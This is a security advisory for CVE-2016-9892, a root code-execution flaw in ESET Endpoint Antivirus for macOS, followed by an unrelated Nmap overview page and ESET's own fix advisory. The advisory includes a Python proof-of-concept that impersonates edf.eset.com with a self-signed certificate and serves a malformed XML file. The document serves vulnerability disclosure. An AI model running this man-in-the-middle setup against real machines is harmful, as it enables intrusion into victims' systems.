CVE-2016-9892 - Remote Code Execution as Root via ESET Endpoint Antivirus 6
---------------------------------------------------------------------------

Summary
=======
Name: Remote Code Execution as Root via ESET Endpoint Antivirus 6
CVE: CVE-2016-9892
Discoverers: Jason Geffner and Jan Bee
Vendor: ESET
Product: ESET Endpoint Antivirus 6 for macOS
Risk: Critical
Discovery Date: 2016-11-03
Publication Data: 2017-02-27
Fixed Version: 6.4.168.0

Introduction
============
Per ESET's online material, "ESET Endpoint Antivirus for OS X delivers award-
winning cross-platform protection for multi-platform environments. It protects
against malware and spyware and shields end users from fake websites phishing
for sensitive information such as usernames, passwords or credit card details.
Unauthorized devices can be blocked from the system entirely. The solution's
highly intuitive interface allows for quick navigation."

Vulnerable versions of ESET Endpoint Antivirus 6 are statically linked with an
outdated XML parsing library and do not perform proper server authentication,
allowing for remote unauthenticated attackers to perform arbitrary code
execution as root on vulnerable clients.

Vulnerability
=============
The esets_daemon service, which runs as root, is statically linked with an
outdated version of the POCO XML parser library (<https://pocoproject.org/>) --
version 1.4.6p1 from 2013-03-06. This version of POCO is based on Expat
(<http://expat.sourceforge.net/>) version 2.0.1 from 2007-06-05, which has a
publicly known XML parsing vulnerability (CVE-2016-0718) that allows for
arbitrary code execution via malformed XML content.

When ESET Endpoint Antivirus tries to activate its license, esets_daemon sends a
request to <https://edf.eset.com/edf>. The esets_daemon service does not validate
the web server's certificate, so a man-in-the-middle can intercept the request
and respond using a self-signed HTTPS certificate. The esets_daemon service
parses the response as an XML document, thereby allowing the attacker to supply
malformed content and exploit CVE-2016-0718 to achieve arbitrary code execution
as root.

Proof of Concept
================
Extract overflow.xml from <https://bugzilla.suse.com/attachment.cgi?id=676490>
(ZIP file containing a public proof-of-concept for CVE-2016-0718) and run the
following Python program:
________________________________________________________________________________
import BaseHTTPServer, SimpleHTTPServer, ssl, subprocess

class XmlHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        with open("overflow.xml") as f:
            xml = f.read()
        self.send_response(200)
        self.send_header("Content-Type", "text/xml")
        self.send_header("Content-Length", len(xml))
        self.end_headers()
        self.wfile.write(xml)

    def do_CONNECT(self):
        self.wfile.write("HTTP/1.1 200 Connection Established\r\n")
        self.end_headers()
        self.connection = ssl.wrap_socket(
                self.connection, certfile="/tmp/xml.crt",
                keyfile="/tmp/xml.key", server_side=True)
        self.rfile = self.connection.makefile("rb", self.rbufsize)
        self.wfile = self.connection.makefile("wb", self.wbufsize)
        self.close_connection = 0

subprocess.call("openssl req -newkey rsa:2048 -x509 -nodes -subj " +
                "/CN=edf.eset.com -out /tmp/xml.crt -keyout /tmp/xml.key",
                shell=True)

BaseHTTPServer.HTTPServer(("localhost", 4443), XmlHandler).serve_forever()
________________________________________________________________________________

Next, open the ESET Endpoint Antivirus UI, choose "Setup --> Enter application
preferences...", and enable a local proxy server for localhost:4443 (this proxy
configuration is used to simulate a man-in-the-middle attack; a real-world
attack would not require a victim to enable a proxy server).

Next, in the ESET Endpoint Antivirus UI, choose "Help --> Activate Product",
enter any License Key value you like (such as 0000-0000-0000-0000-0000), and
press "Activate".

The esets_daemon process will immediately crash (the public PoC overflow.xml
file used above just demonstrates that the vulnerability exists; it does not
perform actual code execution). You can confirm this by running
/Applications/Utilities/Console.app/Contents/MacOS/Console and seeing that
esets_daemon crashed.

Mitigation
==========
ESET patched this vulnerability in ESET Endpoint Antivirus version 6.4.168.0.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

# [CA6333] Remote execution and privilege escalation vulnerabilities in ESET products for macOS fixed

### Summary

ESET Customer Advisory 2017-0003
February 14, 2017
Severity: Critical

ESET was made aware of potential vulnerabilities in its consumer and business products for macOS. Upon detailed inspection, ESET identified the causes of the issues and prepared fixed products for its users to download and install.

### Customer Advisory

## Affected programs and versions

* XML parsing issue and SSL verification issue
  + ESET Cyber Security and ESET Cyber Security Pro 6.1.x – 6.3.70.1
  + ESET Endpoint Antivirus for macOS and ESET Endpoint Security for macOS 6.0.x – 6.3.85.1

## Solution

ESET has prepared fixed builds of consumer and business products for macOS and recommends that users download them from the download section of [www.eset.com](http://www.eset.com) and install them as soon as possible.

The following builds contain the fixes:

* ESET Cyber Security and ESET Cyber Security Pro 6.4.128.0 and later(released on February 13, 2017)—[View instructions to Upgrade to the latest version](https://support.eset.com/en/kb3241-upgrade-eset-cyber-security-or-eset-cyber-security-pro-to-the-latest-version)
* ESET Endpoint Antivirus for macOS and ESET Endpoint Security for macOS 6.4.168.0 and later(released on February 14, 2017)—[View instructions to Upgrade to the latest version](https://support.eset.com/en/kb6352-upgrade-eset-endpoint-security-for-macos-or-eset-endpoint-antivirus-for-macos-to-the-latest-version)

## Details

The following issues were reported to ESET, analyzed and fixed:

* By using an outdated build of 3rd party XML parsing library in ESET products for macOS, it was possible for an attacker to create a specifically-designed XML file, which, when loaded by ESET’s daemon, would execute its malicious code with root privileges. ESET fixed this issue by using a patched build of the XML parsing library.
* Installation wizard of ESET products for macOS executes a script located at /tmp/esets\_setup.sh and loads configuration from /tmp. If an unprivileged user created such files beforehand, a subsequent installation run by a privileged user would load and execute these files. ESET fixed this issue by not using a script file anymore, but rather creating a data file with installation settings that are read and interpreted by esets\_daemon during its first load.
* ESET products for macOS did not verify SSL certificates when communicating with ESET servers. This way, an attacker could perform a man-in-the-middle attack and fake the data received by the product. ESET fixed this issue by implementing SSL certificate verification when communicating with ESET servers.
* Even with proxy features disabled in the setup of ESET products for macOS, esets\_proxy daemon continued to listen on 0.0.0.0:57856, exposing it to non-local connection attempts. ESET fixed this issue by having the daemon listen on 127.0.0.1 instead of 0.0.0.0 and closing all ports when proxy features have been disabled.

To our best knowledge, there are no existing exploits that take advantage of these vulnerabilities in the wild.
